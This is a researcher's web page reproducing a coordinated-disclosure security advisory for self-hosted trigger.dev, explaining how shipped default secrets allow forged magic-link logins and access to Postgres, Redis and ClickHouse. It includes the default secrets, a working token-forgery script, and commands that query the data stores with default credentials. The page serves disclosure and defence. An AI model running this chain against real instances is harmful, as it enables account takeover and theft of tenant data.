---
title: "GHSA-pqxw-g93w-hj9x"
heading: "GHSA-pqxw-g93w-hj9x"
role: "Self-Hosted Deployment: Default Secrets allow Unauthenticated Infrastructure Compromise"
seo_title: "GHSA-pqxw-g93w-hj9x: Self-Hosted Deployment: Default Secrets allow Unauthenticated Infrastructure… - Sanaan Fayaz Wani"
ghsa_id: "GHSA-pqxw-g93w-hj9x"
cve_id: ""
published_at: "2026-07-21"
permalink: /advisories/ghsa-pqxw-g93w-hj9x/
layout: c2
description: "Self-Hosted Deployment: Default Secrets allow Unauthenticated Infrastructure Compromise"
comments: false
last_modified_at: 2026-09-20T03:45:26+00:00
---
<section class="sec g" id="writeup" aria-labelledby="h-writeup">
  <div class="sec-head">
    <p class="idx idx--none">—</p>
    <h2 id="h-writeup">GHSA-pqxw-g93w-hj9x</h2>
    <p class="sec-sub">Published, fixed and credited. Root cause, the vulnerable code, reproduction and the fix, as published in the advisory itself.</p>
  </div>
  <div class="col-body prose" markdown="1">

| | |
|:--|:--|
| Advisory | [GHSA-pqxw-g93w-hj9x](https://github.com/triggerdotdev/trigger.dev/security/advisories/GHSA-pqxw-g93w-hj9x) |
| CVE | not assigned |
| Severity | High (8.1) |
| CVSS vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| CWE | CWE-653 (Improper Isolation or Compartmentalization), CWE-1393 (Use of Default Password) |
| Published | 2026-07-21 |

GitHub published this advisory as High with no CVSS score and no vector, in v3 or v4. The score and vector above are my own assessment of the finding as published.

### Affected versions

| Package | Ecosystem | Vulnerable | Fixed in |
|:--|:--|:--|:--|
| `trigger.dev` | npm | <= 4.5.5 | n/a |

<div markdown="0">
<figure class="fig fig-chain" id="fig-chain" aria-labelledby="chain-h">
  <figcaption>
    <p class="fig-h" id="chain-h">Chain &middot; GHSA-pqxw-g93w-hj9x &middot; trigger.dev</p>
    <p class="fig-note" id="chain-n">Five steps from a file committed to the repository to three data stores with their own credentials. Each step is paired with the control that was supposed to stop it and was not there. Every fact is taken from the published advisory; the right-hand column names the control that advisory says was missing.</p>
  </figcaption>

  <p class="fig-vh">Text alternative. Step 00: the repository ships hosting/docker/.env.example containing four fixed secrets, among them MAGIC_LINK_SECRET equal to 44da78b7bbb0dfe709cf38931d25dcdd; the documented install copies that file to .env. Absent control: secrets are not generated on first boot and the service does not refuse to start on a known value. Step 01: the attacker forges a magic link offline by AES-encrypting a JSON payload naming any email address with that secret, which remix-auth-email-link version 2.0.2 accepts. Absent control: the token is encryption rather than a server-side record, so nothing ties it to a link the server actually issued. Step 02: requesting /magic with the forged token returns HTTP 302 and sets a __session cookie. Absent control: validateSessionMagicLink defaults to false in the library and trigger.dev never overrides it, so no session-side check confirms this browser asked for the link. Step 03: the account is created on the spot because WHITELISTED_EMAILS is unset, which is the self-hosted default; the attacker is now any user they named. Absent control: no allowlist and no email delivery step proving control of the address. Step 04: hosting/docker/worker/docker-compose.yml line 42 sets DOCKER_RUNNER_NETWORKS to webapp and supervisor, placing runner containers on the same Docker networks as the platform's own data stores. Absent control: no segmentation between run sandboxes and infrastructure. From there the advisory verifies Postgres reachable with the default password unsafe-postgres-pw and returning the User table, Redis answering PING with no authentication, and ClickHouse answering a version query as default colon password; separately, ENCRYPTION_KEY sits in the same shipped file, so data the platform encrypted at rest is decryptable.</p>

  <ol class="ch-steps" aria-hidden="true">
    <li class="ch-step">
      <p class="ch-i">00</p>
      <div class="ch-b">
        <p class="ch-act">The secret ships in the repository</p>
        <p class="ch-ev"><code>hosting/docker/.env.example</code> lines 9&ndash;12 hold four fixed values, among them <code>MAGIC_LINK_SECRET=44da78b7bbb0dfe709cf38931d25dcdd</code>. The documented install is <code>cp .env.example .env</code>.</p>
      </div>
      <p class="ch-gate"><span class="ch-gk">Absent control</span>Secrets are not generated on first boot, and the service does not refuse to start on a known value.</p>
    </li>
    <li class="ch-step">
      <p class="ch-i">01</p>
      <div class="ch-b">
        <p class="ch-act">Forge a magic link, offline</p>
        <p class="ch-ev"><code>CryptoJS.AES.encrypt(JSON.stringify({e:'attacker@evil.com',c:Date.now()}), secret)</code>. No contact with the target yet. <code>remix-auth-email-link@2.0.2</code> accepts the result.</p>
      </div>
      <p class="ch-gate"><span class="ch-gk">Absent control</span>The token is encryption, not a server-side record. Nothing binds it to a link the server actually issued.</p>
    </li>
    <li class="ch-step">
      <p class="ch-i">02</p>
      <div class="ch-b">
        <p class="ch-act">Redeem it</p>
        <p class="ch-ev"><code>GET /magic?token=&hellip;</code> returns <code>HTTP 302</code> with <code>set-cookie: __session=&hellip;</code></p>
      </div>
      <p class="ch-gate"><span class="ch-gk">Absent control</span><code>validateSessionMagicLink</code> defaults to <code>false</code> in the library and is never overridden, so nothing checks that this browser asked for the link.</p>
    </li>
    <li class="ch-step">
      <p class="ch-i">03</p>
      <div class="ch-b">
        <p class="ch-act">Become any user</p>
        <p class="ch-ev">The account is created on the spot: <code>WHITELISTED_EMAILS</code> unset is the self-hosted default.</p>
      </div>
      <p class="ch-gate"><span class="ch-gk">Absent control</span>No allowlist, and no email delivery step that would prove control of the address.</p>
    </li>
    <li class="ch-step">
      <p class="ch-i">04</p>
      <div class="ch-b">
        <p class="ch-act">Stand on the infrastructure network</p>
        <p class="ch-ev"><code>DOCKER_RUNNER_NETWORKS: webapp,supervisor</code> &mdash; <code>hosting/docker/worker/docker-compose.yml:42</code> puts runner containers on the same Docker networks as the platform&rsquo;s own data stores.</p>
      </div>
      <p class="ch-gate"><span class="ch-gk">Absent control</span>No segmentation between run sandboxes and infrastructure.</p>
    </li>
  </ol>

  <div class="ch-bus" aria-hidden="true"></div>

  <ul class="ch-leaves" aria-hidden="true">
    <li>
      <p class="ch-ln">Postgres</p>
      <p class="ch-le">Default password <code>unsafe-postgres-pw</code>. <code>SELECT id, email FROM "User"</code> returns the forged account.</p>
    </li>
    <li>
      <p class="ch-ln">Redis</p>
      <p class="ch-le">No authentication configured. <code>redis-cli -h redis PING</code> answers <code>PONG</code>.</p>
    </li>
    <li>
      <p class="ch-ln">ClickHouse</p>
      <p class="ch-le">Default <code>default:password</code>. A version query answers <code>25.5.2.47</code>.</p>
    </li>
    <li>
      <p class="ch-ln">Secrets at rest</p>
      <p class="ch-le">No network needed: <code>ENCRYPTION_KEY</code> is in the same shipped file, so stored secrets decrypt.</p>
    </li>
  </ul>

  <p class="ch-scope"><b>Scope changed.</b> The vulnerable component is the webapp. Postgres, Redis and ClickHouse are separate security authorities with credentials of their own, and the chain reaches them anyway. That is the <code>S:C</code> in the vector, and it is most of what separates this from a single-app compromise.</p>

  <p class="fig-foot">Vector <code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H</code> at 9.0. This advisory was published with a severity but no CVSS score and no vector, so the score and vector here are my own assessment of the finding as published. Steps 3 to 5 of the advisory verify Postgres, Redis and ClickHouse with commands; pushing backdoored images to the registry and manipulating job queues are stated in its impact section without a verification step. Affects trigger.dev <code>&lt;= 4.5.5</code>. Published 2026-07-21.</p>
</figure>
</div>

## Summary

Self-hosted trigger.dev v4 instances deployed using the provided Docker Compose configuration with default secrets from `hosting/docker/.env.example` are vulnerable to a multi-stage unauthenticated attack chain leading to complete infrastructure compromise.

## Vulnerability Details

The `hosting/docker/.env.example` file contains hardcoded cryptographic secrets:

```
SESSION_SECRET=2818143646516f6fffd707b36f334bbb
MAGIC_LINK_SECRET=44da78b7bbb0dfe709cf38931d25dcdd
ENCRYPTION_KEY=f686147ab967943ebbe9ed3b496e465a
MANAGED_WORKER_SECRET=447c29678f9eaf289e9c4b70d3dd8a7f
```

The `MAGIC_LINK_SECRET` is used by `remix-auth-email-link@2.0.2` to create authentication tokens via CryptoJS AES encryption. An attacker who knows this secret can forge valid magic links that authenticate as any email address without email delivery. The `validateSessionMagicLink` option defaults to `false` in the library (never overridden by trigger.dev), so no session-side validation occurs. User accounts are auto-created when `WHITELISTED_EMAILS` is not set (the default for self-hosted).

## Steps to Reproduce

### Setup
```bash
cd hosting/docker && cp .env.example .env
cd webapp && docker compose up -d
cd ../worker && docker compose up -d
```

### Step 1: Forge magic link token
```javascript
const CryptoJS = require('crypto-js');
const secret = '44da78b7bbb0dfe709cf38931d25dcdd';
const payload = JSON.stringify({e: 'attacker@evil.com', c: Date.now()});
const token = encodeURIComponent(CryptoJS.AES.encrypt(payload, secret).toString());
console.log('https://target:8030/magic?token=' + token);
```

### Step 2: Authenticate via forged magic link
```bash
curl -v "http://localhost:8030/magic?token="
# Returns: HTTP 302, set-cookie: __session=eyJ1c2VyIjp7InVzZXJJZCI6ImNtcGg3OTBxZjAwMDR0bjU1ZWM3bHlxN2EifX0=...
# User auto-created, session cookie set, redirects to /orgs/new
```

### Step 3: Verify database access from runner network
```bash
docker run --rm --network webapp postgres:14 psql "postgresql://postgres:unsafe-postgres-pw@postgres:5432/main" -c "SELECT id, email FROM \"User\";"
# Returns: cmph790qf0004tn55ec7lyq7a | attacker@evil.com
```

### Step 4: Verify Redis access (no auth)
```bash
docker run --rm --network webapp redis:7 redis-cli -h redis PING
# Returns: PONG
```

### Step 5: Verify ClickHouse access
```bash
docker run --rm --network webapp curlimages/curl curl -s "http://default:password@clickhouse:8123/?query=SELECT%20version()"
# Returns: 25.5.2.47
```

## Root Cause

1. Hardcoded secrets in `hosting/docker/.env.example` (lines 9-12)
2. Runner containers placed on infrastructure networks: `DOCKER_RUNNER_NETWORKS: webapp,supervisor` in `hosting/docker/worker/docker-compose.yml:42`
3. Default credentials on all infrastructure services
4. No Redis authentication
5. SESSION_SECRET reused for JWT signing (`apps/webapp/app/services/apiAuth.server.ts:616`) and impersonation tokens

## Impact

Complete infrastructure compromise: all tenant data, API keys, encrypted secrets (decryptable with known ENCRYPTION_KEY), user accounts, cross-tenant access. Attacker can modify data, push backdoored Docker images to the registry, and manipulate job queues.

## About this writeup

Sanaan Fayaz Wani (GitHub [`sfwani`](https://github.com/sfwani)) reported this vulnerability to the `trigger.dev` maintainers under coordinated disclosure and is credited as a reporter in [GHSA-pqxw-g93w-hj9x](https://github.com/triggerdotdev/trigger.dev/security/advisories/GHSA-pqxw-g93w-hj9x), published 2026-07-21.

All published findings: [advisory index](/advisories/).


  </div>
</section>
